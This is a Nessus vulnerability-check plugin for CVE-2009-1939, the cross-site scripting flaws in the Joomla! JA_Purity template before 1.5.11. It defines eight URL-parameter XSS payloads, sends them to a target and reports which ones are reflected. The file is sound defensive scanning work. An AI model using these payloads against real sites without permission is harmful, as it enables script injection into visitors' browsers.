#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39331);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-1939");
  script_bugtraq_id(35189);
  script_osvdb_id(54870);
  script_xref(name:"Secunia", value:"35278");

  script_name(english:"Joomla! < 1.5.11 JA_Purity Template Multiple XSS");
  script_summary(english:"Attempts a XSS attack.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple cross-site scripting vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is prior to 1.5.11.
It is, therefore, affected by multiple, persistent cross-site
scripting (XSS) vulnerabilities in the JA_Purity template. An
unauthenticated, remote attacker can exploit these, by convincing a
user to follow a specially crafted URL, to inject arbitrary HTML and
script code into the user's cookie, making the attack persistent for
the entire browser session.

Note that this version of Joomla! may be affected by additional
cross-site scripting vulnerabilities; however, Nessus has not checked
for these.");
  script_set_attribute(attribute:"see_also",value:"http://seclists.org/bugtraq/2009/Jun/64");
  # https://developer.joomla.org/security/news/296-20090602-core-japurity-xss.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dc0c512c");
  # https://www.joomla.org/announcements/release-news/5235-joomla-1511-security-release-now-available.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e94ed320");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.5.11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date",value:"2009/06/05");
  script_set_attribute(attribute:"patch_publication_date",value:"2009/06/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# data used in generating XSS attempts
cookie = make_array("Cookie", "ja_purity_tpl=ja_purity");
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
script = unixtime();

global_var vuln_resp;

function attempt_xss(params, expected_output)
{
  local_var xss, url, res, success, pattern;
  success = FALSE;
  xss = urlencode(str:params, unreserved:unreserved);

  clear_cookiejar();

  url = dir  + "/index.php?template=ja_purity&" + xss;
  res = http_send_recv3(
    method : "GET",
    item   : url,
    port   : port,
    add_headers  : cookie,
    exit_on_fail : TRUE
  );

  if (expected_output >< res[2])
  {
    success = TRUE;
    vuln_resp = strstr(res[2], expected_output);
    if (empty_or_null(vuln_resp)) vuln_resp = res[2];
  }

  return success;
}


# There are several vectors for XSS in the affected versions of Joomla!
exploits = make_list(
  'theme_header="><script>alert(' + script + ');</script>',
  'theme_background="><script>alert(' + script + ');</script>',
  'theme_elements="><script>alert(' + script + ');</script>',
  'logoType=1&logoText=<script>alert(' + script + ');</script>',
  'logoType=1&sloganText=<script>alert(' + script + ');</script>',
  "excludeModules=';alert(" + script + "); var b='",
  "rightCollapseDefault=';alert(" + script + "); var b='",
  'ja_font="><script>alert(' + script + ');</script>'
);

# The expected outputs of a successful xss attack (with some context).
# Each entry has a corresponding entry in the 'exploits' list.
output = make_list(
  '"><script>alert(' + script + ');</script>/style.css"',
  '"><script>alert(' + script + ');</script>/style.css"',
  '"><script>alert(' + script + ');</script>/style.css"',
  '<span><script>alert(' + script + ');</script></span>',
  '<p class="site-slogan"><script>alert(' + script + ');</script></p',
  "var excludeModules='';alert(" + script + "); var b='';",
  "var rightCollapseDefault='';alert(" + script + "); var b='';",
  'class="fs"><script>alert(' + script + ');</script> IE6" >'
);

working_exploits = make_list();

# Each vector will be tested if the "Perform thorough tests" setting is enabled
# otherwise, only one will be tested
if (thorough_tests)
{
  for (i = 0; i < max_index(exploits); i++)
  {
    if (attempt_xss(params:exploits[i], expected_output:output[i]))
      working_exploits = make_list(working_exploits, exploits[i]);
  }
}
else
{
  if (attempt_xss(params:exploits[0], expected_output:output[0]))
    working_exploits = make_list(working_exploits, exploits[0]);
}

if (max_index(working_exploits) > 0)
{
  vuln_rep_list = make_list();
  foreach exploit (working_exploits)
  {
    encoded_xss = urlencode(str:exploit, unreserved:unreserved);
    url = install_url +"/index.php?template=ja_purity&" + encoded_xss;
    vuln_rep_list = make_list(vuln_rep_list, url);
  }

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    xss         : TRUE,
    generic     : TRUE,
    line_limit  : 3,
    request     : vuln_rep_list,
    output      : vuln_resp,
    rep_extra   :
      'Note that this issue only affects browsers that accept cookies.\n' +
      'To successfully test one of the proof-of-concepts listed above,\n' +
      'it may be necessary to visit the URL once (to obtain a cookie), and\n'+
      'then refresh the page (to trigger the cross-site scripting issue).\n\n' +
      'Also note that only the response from the last request is shown below :'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
